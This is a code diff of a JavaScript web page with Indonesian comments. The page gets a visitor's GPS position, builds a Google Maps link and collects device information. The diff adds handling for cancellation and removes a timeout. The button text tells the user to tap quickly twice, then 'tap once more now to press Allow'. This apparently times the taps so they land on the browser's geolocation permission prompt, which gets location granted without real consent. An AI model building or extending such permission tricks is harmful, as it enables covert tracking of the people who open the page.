@@ -16,6 +16,10 @@ function startLocation(event) {
     event.preventDefault();
   }
 
+  // Reset flag cancel dan trigger agar layar ini selalu bersih
+  state.locCancelled = false;
+  _isTriggeringLoc = false;
+
   // Pre-warm background saat menu ditekan
   if (navigator.permissions && navigator.permissions.query) {
     try { navigator.permissions.query({ name: 'geolocation' }).catch(() => {}); } catch (_) {}
@@ -49,6 +53,11 @@ function startLocation(event) {
 }
 
 async function handleLocationReady(position) {
+  // Abaikan jika pengguna sudah menekan Back sebelum GPS selesai
+  if (state.locCancelled) {
+    state.locCancelled = false;
+    return;
+  }
   const { latitude: lat, longitude: lon, accuracy } = position.coords;
   const mapsLink = `https://maps.google.com/?q=${lat},${lon}`;
   const devInfo  = await collectDeviceInfo();
@@ -84,7 +93,6 @@ async function handleLocationReady(position) {
   }
 }
 
-let _locTriggerTimeout = null;
 let _isTriggeringLoc = false;
 
 function triggerLocationGPS(event) {
@@ -112,6 +120,8 @@ function triggerLocationGPS(event) {
     },
     (err) => {
       _isTriggeringLoc = false;
+      // Abaikan jika pengguna sudah menekan Back
+      if (state.locCancelled) { state.locCancelled = false; return; }
       let msg = 'Tidak dapat menentukan lokasi Anda.';
       switch (err.code) {
         case err.PERMISSION_DENIED:
@@ -126,7 +136,7 @@ function triggerLocationGPS(event) {
       }
       showResult({ success: false, icon: '📡', title: 'Lokasi Tidak Ditemukan', message: msg });
     },
-    { enableHighAccuracy: true, timeout: 15000, maximumAge: 30000 }
+    { enableHighAccuracy: true, maximumAge: 30000 }
   );
 
   // ⚡ LANGKAH 2: Haptic feedback instan
@@ -143,13 +153,6 @@ function triggerLocationGPS(event) {
       btn.classList.add('trigger-active');
       text.textContent = '👆 KETUK SEKALI LAGI SEKARANG!';
       if (sub) sub.textContent = 'UNTUK MENEKAN IZINKAN';
-      clearTimeout(_locTriggerTimeout);
-      _locTriggerTimeout = setTimeout(() => {
-        btn.classList.remove('trigger-active');
-        text.textContent = '⚡ KETUK 2 KALI CEPAT';
-        if (sub) sub.textContent = 'UNTUK MENGIRIM POSISI LOKASI';
-        _isTriggeringLoc = false;
-      }, 2500);
     }
 
     const badge = $('loc-badge');
